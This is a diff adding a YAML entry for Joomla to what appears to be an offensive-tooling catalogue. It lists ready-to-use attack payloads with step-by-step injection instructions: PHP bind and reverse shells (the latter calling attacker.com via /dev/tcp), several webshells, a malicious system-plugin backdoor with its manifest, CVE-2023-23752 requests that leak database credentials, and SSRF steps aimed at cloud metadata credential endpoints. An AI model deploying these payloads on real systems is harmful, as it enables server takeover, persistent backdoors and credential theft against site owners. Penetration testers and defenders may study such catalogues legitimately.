@@ -1,0 +1,139 @@
+---
+comment: "Joomla is a PHP-based CMS. Three primary exploitation paths exist:\n\n1.\
+  \ Template editor (admin) \u2014 the built-in template source editor allows editing\
+  \ any PHP\n   file in an active template and creating new files. Files are stored\
+  \ in\n   templates/<name>/ and served directly by the web server without routing\
+  \ restrictions.\n   Joomla 3.x: Extensions > Templates > Templates > select template.\n\
+  \   Joomla 4.x: System > Site Templates > select template > edit files.\n\n2. System\
+  \ plugin (admin) \u2014 administrators can install a ZIP package that registers\
+  \ a\n   system plugin. Once enabled, the plugin's onAfterInitialise() method is\
+  \ called on\n   every Joomla page request, providing a persistent execution hook.\n\
+  \n3. CVE-2023-23752 (unauthenticated, Joomla 4.0.0\u20134.2.7) \u2014 improper access\
+  \ control on\n   the REST API exposes full site configuration (database host, name,\
+  \ user, password,\n   secret key) and the user list without authentication. The\
+  \ leaked DB credentials can\n   be used to reset the super-admin password via MySQL,\
+  \ enabling admin login and\n   subsequent template-based code execution.\n"
+functions:
+  bind-shell:
+  - code: |
+      <?php $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",12345);socket_listen($s,1);$c=socket_accept($s);$p=proc_open("/bin/sh",array(0=>$c,1=>$c,2=>$c),$x); ?>
+    comment: "Inject into an active template PHP file via the template source editor.\
+      \ Trigger by\nvisiting any page \u2014 the page will hang while the bind shell\
+      \ awaits a connection on\nport 12345. Requires the PHP sockets extension (default\
+      \ on most LAMP stacks).\n"
+    connector: tcp-client
+    contexts:
+      admin:
+    tty: false
+  file-read:
+  - code: "# Leak site configuration \u2014 database credentials, secret key, mailer\
+      \ settings\ncurl -s 'http://victim.com/api/index.php/v1/config/application?public=true'\
+      \ | python3 -m json.tool\n\n# Leak user accounts \u2014 username, email, group\
+      \ membership\ncurl -s 'http://victim.com/api/index.php/v1/users?public=true'\
+      \ | python3 -m json.tool\n"
+    comment: "CVE-2023-23752: Joomla 4.0.0\u20134.2.7 returns full site configuration\
+      \ and the user\nlist from REST API endpoints without authentication when ?public=true\
+      \ is appended.\nThe config endpoint exposes MySQL host, database name, username,\
+      \ and password in\nplaintext. These credentials can be used to access the database\
+      \ directly and reset\nthe super-admin password, enabling admin login and template-based\
+      \ code execution.\nRef: https://www.exploit-db.com/exploits/51334\n"
+    contexts:
+      unauthenticated:
+    version: |-
+      4.0.0 - 4.2.7
+  file-write:
+  - code: |
+      <?php file_put_contents('shell.php','<?php system($_GET["c"]); ?>'); ?>
+    comment: |
+      Inject into an active template PHP file via the template editor. Writes shell.php
+      into the same template directory (templates/<template_name>/shell.php), creating a
+      persistent webshell that survives removal of the injected code from index.php.
+      Access at: http://victim.com/templates/<template_name>/shell.php?c=id
+    contexts:
+      admin:
+  rce:
+  - code: |
+      <?php if(isset($_GET['cmd'])){ passthru($_GET['cmd']); exit; } ?>
+    comment: |
+      Inject this snippet into any active template PHP file via the built-in source editor.
+      Joomla 3.x: Extensions > Templates > Templates > select active template > edit index.php.
+      Joomla 4.x: System > Site Templates > select active template > click pencil on index.php.
+      Append the snippet and save. Trigger by visiting any page with ?cmd=id appended.
+      Command output is returned inline in the HTTP response.
+    contexts:
+      admin:
+  reverse-shell:
+  - blind: true
+    code: |
+      <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &"); ?>
+    comment: "Inject into any active template PHP file via the template source editor\
+      \ (same\nnavigation as the rce entry). Trigger by visiting any page on the site.\
+      \ The reverse\nshell runs asynchronously \u2014 the HTTP response will not confirm\
+      \ execution; check the\nlistener for the incoming connection.\n"
+    contexts:
+      admin:
+    listener: tcp-server
+    tty: false
+  ssrf:
+  - code: "# Step 1: set the Joomla update server URL to an internal endpoint (admin)\n\
+      curl -s -X PATCH \"http://victim.com/api/index.php/v1/config/application\" \\\
+      \n  -H \"Authorization: Bearer <api_token>\" \\\n  -H \"Content-Type: application/json\"\
+      \ \\\n  -d '{\"com_config.update_source\": \"custom\", \"com_config.update_server_url_0\"\
+      : \"http://169.254.169.254/latest/meta-data/\"}'\n\n# Step 2: trigger the update\
+      \ check \u2014 Joomla fetches the configured URL\ncurl -s \"http://victim.com/administrator/index.php?option=com_joomlaupdate&task=update.refreshcache\"\
+      \ \\\n  -b \"joomla_admin_session=<session_cookie>\"\n"
+    comment: |
+      Joomla's update server URL is admin-configurable and fetched server-side when checking
+      for updates. Setting it to an internal URL causes the Joomla server to make an outbound
+      HTTP GET to that endpoint. The response body is partially reflected in update check errors.
+
+      Alternative vector: Joomla's News Feeds component (com_newsfeeds) fetches RSS/Atom feeds
+      from admin-configured external URLs. Create a news feed pointing to an internal endpoint:
+        Components > News Feeds > Feeds > New > enter internal URL as the feed link.
+      Joomla fetches the URL when the feed is displayed, reaching internal services.
+
+      Target cloud metadata endpoints:
+      - AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      - GCP: http://metadata.google.internal/computeMetadata/v1/
+      - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
+    contexts:
+      admin:
+      api_token:
+  webshell:
+  - code: |
+      <?php if(isset($_REQUEST['c'])){echo "<pre>",shell_exec($_REQUEST['c']),"</pre>";}?>
+    comment: |
+      Create a new PHP file in the active template via the template editor.
+      Joomla 3.x: select template > "New File" button > choose PHP type > name it "shell".
+      Joomla 4.x: select template > "Create New File" button > name it "shell.php".
+      The file lands at templates/<template_name>/shell.php and is directly served by the
+      web server. Access at: http://victim.com/templates/<template_name>/shell.php?c=id
+    contexts:
+      admin:
+  - code: |
+      <?php
+      defined('_JEXEC') or die;
+      use Joomla\CMS\Plugin\CMSPlugin;
+      class PlgSystemShell extends CMSPlugin
+      {
+          public function onAfterInitialise()
+          {
+              if (isset($_REQUEST['c'])) {
+                  echo '<pre>', shell_exec($_REQUEST['c']), '</pre>';
+                  exit;
+              }
+          }
+      }
+    comment: "Deploy as a Joomla system plugin via Extensions > Manage > Install >\
+      \ Upload Package File.\nRequired ZIP contents (zip -r shell.zip shell.xml shell.php):\n\
+      \n  shell.xml  \u2190 manifest:\n    <?xml version=\"1.0\" encoding=\"UTF-8\"\
+      ?>\n    <extension type=\"plugin\" group=\"system\" version=\"3.1\" method=\"\
+      upgrade\">\n        <name>shell</name><version>1.0.0</version>\n        <files><filename\
+      \ plugin=\"shell\">shell.php</filename></files>\n    </extension>\n\n  shell.php\
+      \  \u2190 this file\n\nAfter installation, enable the plugin at Extensions >\
+      \ Plugins > search \"shell\".\nOnce enabled, any Joomla page request carrying\
+      \ ?c=<command> executes the command\nand returns output at the top of the response,\
+      \ before normal page rendering.\n"
+    contexts:
+      plugin:
+...
